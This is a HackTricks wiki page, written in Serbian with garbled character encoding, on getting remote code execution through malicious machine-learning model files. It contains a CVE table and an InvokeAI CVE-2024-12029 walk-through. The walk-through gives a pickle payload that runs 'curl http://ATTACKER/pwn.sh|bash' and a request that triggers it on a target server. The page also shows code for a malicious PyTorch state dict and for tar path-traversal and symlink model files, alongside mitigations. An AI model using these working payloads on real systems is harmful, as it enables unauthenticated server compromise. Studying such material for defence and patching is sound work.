# Models RCE

{{#include ../banners/hacktricks-training.md}}

## Uƒçitavanje modela u RCE

Modeli ma≈°inskog uƒçenja obiƒçno se dele u razliƒçitim formatima, kao ≈°to su ONNX, TensorFlow, PyTorch, itd. Ovi modeli se mogu uƒçitati na ma≈°ine programera ili proizvodne sisteme za kori≈°ƒáenje. Obiƒçno modeli ne bi trebali sadr≈æati zlonamerni kod, ali postoje sluƒçajevi kada se model mo≈æe koristiti za izvr≈°avanje proizvoljnog koda na sistemu kao nameravana funkcija ili zbog ranjivosti u biblioteci za uƒçitavanje modela.

U vreme pisanja ovo su neki primeri ovog tipa ranjivosti:

| **Okvir / Alat**            | **Ranjivost (CVE ako je dostupno)**                                                                                          | **RCE Vektor**                                                                                                                         | **Reference**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Neosigurana deseralizacija u* `torch.load` **(CVE-2025-32434)**                                                            | Zlonameran pickle u model checkpoint-u dovodi do izvr≈°avanja koda (zaobilazeƒái `weights_only` za≈°titu)                                   | |
| PyTorch **TorchServe**      | *ShellTorch* ‚Äì **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + zlonamerno preuzimanje modela uzrokuje izvr≈°avanje koda; Java deseralizacija RCE u API-ju za upravljanje                        | |
| **TensorFlow/Keras**        | **CVE-2021-37678** (nesiguran YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                    | Uƒçitavanje modela iz YAML koristi `yaml.unsafe_load` (izvr≈°avanje koda) <br> Uƒçitavanje modela sa **Lambda** slojem izvr≈°ava proizvoljan Python kod | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsiranje)                                                                                        | Prilagoƒëeni `.tflite` model izaziva prelivanje celobrojne vrednosti ‚Üí o≈°teƒáenje heap-a (potencijalni RCE)                               | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Uƒçitavanje modela putem `joblib.load` izvr≈°ava pickle sa napadaƒçevim `__reduce__` payload-om                                          | |
| **NumPy** (Python)          | **CVE-2019-6446** (nesiguran `np.load`) *sporan*                                                                             | `numpy.load` podrazumevano dozvoljava pickled objekte nizova ‚Äì zlonameran `.npy/.npz` izaziva izvr≈°avanje koda                          | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | Spoljna putanja te≈æina ONNX modela mo≈æe pobjeƒái iz direktorijuma (ƒçitati proizvoljne datoteke) <br> Zlonamerni ONNX model tar mo≈æe prepisati proizvoljne datoteke (dovodeƒái do RCE) | |
| ONNX Runtime (dizajnerski rizik) | *(Nema CVE)* ONNX prilagoƒëene operacije / kontrolni tok                                                                  | Model sa prilagoƒëenim operatorom zahteva uƒçitavanje napadaƒçeve nativne koda; slo≈æeni grafovi modela zloupotrebljavaju logiku za izvr≈°avanje nepredviƒëenih proraƒçuna | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (putanja prelaz)                                                                                          | Kori≈°ƒáenje API-ja za uƒçitavanje modela sa `--model-control` omoguƒáeno omoguƒáava relativno prelaz putanje za pisanje datoteka (npr., prepisivanje `.bashrc` za RCE) | |
| **GGML (GGUF format)**      | **CVE-2024-25664 ‚Ä¶ 25668** (vi≈°e heap prelivanja)                                                                           | Neispravan GGUF model datoteke uzrokuje prelivanje bafera u parseru, omoguƒáavajuƒái proizvoljno izvr≈°avanje koda na sistemu ≈ærtve        | |
| **Keras (stariji formati)** | *(Nema novog CVE)* Nasleƒëeni Keras H5 model                                                                                  | Zlonameran HDF5 (`.h5`) model sa kodom Lambda sloja i dalje izvr≈°ava prilikom uƒçitavanja (Keras safe_mode ne pokriva stari format ‚Äì ‚Äúnapad sni≈æavanja‚Äù) | |
| **Drugi** (op≈°ti)           | *Dizajnerska gre≈°ka* ‚Äì Pickle serijalizacija                                                                                 | Mnogi ML alati (npr., pickle-bazirani formati modela, Python `pickle.load`) ƒáe izvr≈°iti proizvoljni kod ugraƒëen u datoteke modela osim ako se ne ubla≈æi | |

Pored toga, postoje neki modeli zasnovani na Python pickle-u, poput onih koje koristi [PyTorch](https://github.com/pytorch/pytorch/security), koji se mogu koristiti za izvr≈°avanje proizvoljnog koda na sistemu ako se ne uƒçitaju sa `weights_only=True`. Dakle, svaki model zasnovan na pickle-u mo≈æe biti posebno podlo≈æan ovim vrstama napada, ƒçak i ako nisu navedeni u tabeli iznad.

### üÜï  InvokeAI RCE putem `torch.load` (CVE-2024-12029)

`InvokeAI` je popularno open-source web suƒçelje za Stable-Diffusion. Verzije **5.3.1 ‚Äì 5.4.2** izla≈æu REST endpoint `/api/v2/models/install` koji omoguƒáava korisnicima da preuzmu i uƒçitaju modele sa proizvoljnih URL-ova.

Interno, endpoint na kraju poziva:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
Kada je dostavljeni fajl **PyTorch checkpoint (`*.ckpt`)**, `torch.load` vr≈°i **pickle deserializaciju**. Po≈°to sadr≈æaj dolazi direktno sa URL-a koji kontroli≈°e korisnik, napadaƒç mo≈æe ugraditi zlonamerni objekat sa prilagoƒëenom `__reduce__` metodom unutar checkpoint-a; metoda se izvr≈°ava **tokom deserializacije**, ≈°to dovodi do **remote code execution (RCE)** na InvokeAI serveru.

Ranljivost je dodeljena **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Exploitation walk-through

1. Kreirajte zlonamerni checkpoint:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. Host `payload.ckpt` na HTTP serveru koji kontroli≈°ete (npr. `http://ATTACKER/payload.ckpt`).
3. Aktivirajte ranjivu taƒçku (nije potrebna autentifikacija):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false ‚Üí no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. Kada InvokeAI preuzme datoteku, poziva `torch.load()` ‚Üí `os.system` gadget se pokreƒáe i napadaƒç dobija izvr≈°enje koda u kontekstu InvokeAI procesa.

Ready-made exploit: **Metasploit** modul `exploit/linux/http/invokeai_rce_cve_2024_12029` automatizuje ceo tok.

#### Uslovi

‚Ä¢  InvokeAI 5.3.1-5.4.2 (podrazumevana oznaka skeniranja **false**)
‚Ä¢  `/api/v2/models/install` dostupan napadaƒçu
‚Ä¢  Proces ima dozvole za izvr≈°avanje shell komandi

#### Moguƒánosti ubla≈æavanja

* A≈æurirajte na **InvokeAI ‚â• 5.4.3** ‚Äì zakrpa postavlja `scan=True` podrazumevano i vr≈°i skeniranje zlonamernog softvera pre deserializacije.
* Kada programatski uƒçitavate taƒçke, koristite `torch.load(file, weights_only=True)` ili novi [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) pomoƒáni alat.
* Sprovodite liste dozvoljenih / potpisa za izvore modela i pokreƒáite uslugu sa minimalnim privilegijama.

> ‚ö†Ô∏è Zapamtite da je **bilo koji** Python pickle-bazirani format (ukljuƒçujuƒái mnoge `.pt`, `.pkl`, `.ckpt`, `.pth` datoteke) inherentno nesiguran za deserializaciju iz nepouzdanih izvora.

---

Primer ad-hoc ubla≈æavanja ako morate zadr≈æati starije verzije InvokeAI koje rade iza reverznog proksija:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
## Primer ‚Äì kreiranje zlonamernog PyTorch modela

- Kreirajte model:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Uƒçitaj model:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ‚ö†Ô∏è This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
## Models to Path Traversal

Kao ≈°to je komentarisano u [**ovom blog postu**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), veƒáina formata modela koje koriste razliƒçiti AI okviri zasniva se na arhivama, obiƒçno `.zip`. Stoga, mo≈æe biti moguƒáe zloupotrebiti ove formate za izvoƒëenje napada na pretragu putanja, omoguƒáavajuƒái ƒçitanje proizvoljnih datoteka sa sistema na kojem je model uƒçitan.

Na primer, sa sledeƒáim kodom mo≈æete kreirati model koji ƒáe kreirati datoteku u `/tmp` direktorijumu kada se uƒçita:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
Ili, sa sledeƒáim kodom mo≈æete kreirati model koji ƒáe napraviti symlink ka direktorijumu `/tmp` kada se uƒçita:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
## Reference

- [OffSec blog ‚Äì "CVE-2024-12029 ‚Äì InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch ‚Äì security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)

{{#include ../banners/hacktricks-training.md}}
